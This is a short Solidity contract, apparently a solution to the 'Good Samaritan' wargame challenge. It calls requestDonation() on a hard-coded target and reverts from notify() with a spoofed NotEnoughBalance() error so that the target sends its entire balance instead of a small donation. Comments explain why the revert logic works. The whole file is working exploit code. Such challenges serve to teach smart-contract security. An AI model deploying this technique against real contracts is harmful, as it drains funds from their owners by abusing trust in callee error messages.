// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GoodSamaritan.sol";

contract BadSamaritan {

    error NotEnoughBalance();

    GoodSamaritan goodsamaritan  = GoodSamaritan(0xcf2e93212faddDeB5ca99606104Be3Bae28e27A4);
    function attack() external {
        goodsamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
    // if you simply revert NotEnoughBalance() this function will also revert the transferRemainder call too. 
    // In this case the if statement reverts
    // and the function data will have the NotEnoughBalance() error

        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}